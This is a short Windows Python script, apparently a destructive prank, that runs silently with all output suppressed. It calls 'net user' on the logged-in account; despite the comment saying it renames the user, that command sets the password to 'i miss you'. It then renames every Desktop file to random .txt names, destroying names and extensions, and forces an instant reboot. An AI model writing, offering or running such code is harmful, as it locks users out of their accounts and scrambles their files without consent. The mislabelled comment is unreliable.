import os
import random
import ctypes
import sys

# Redirect standard output and standard error to suppress messages
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

# Function to rename the current user
def rename_current_user(new_username):
    try:
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0, 0)
        os.system(f'net user {os.getlogin()} {new_username}')
    except Exception as e:
        pass

# Function to rename files on the desktop
def rename_files_on_desktop():
    desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
    try:
        for filename in os.listdir(desktop_path):
            if os.path.isfile(os.path.join(desktop_path, filename)):
                new_filename = f'i really do {random.randint(1, 10000)}.txt'
                os.rename(os.path.join(desktop_path, filename), os.path.join(desktop_path, new_filename))
    except Exception as e:
        pass

# Function to restart the computer
def restart_computer():
    os.system('shutdown /r /t 0')

# Main execution
if __name__ == '__main__':
    rename_current_user('i miss you')
    rename_files_on_desktop()
    restart_computer()
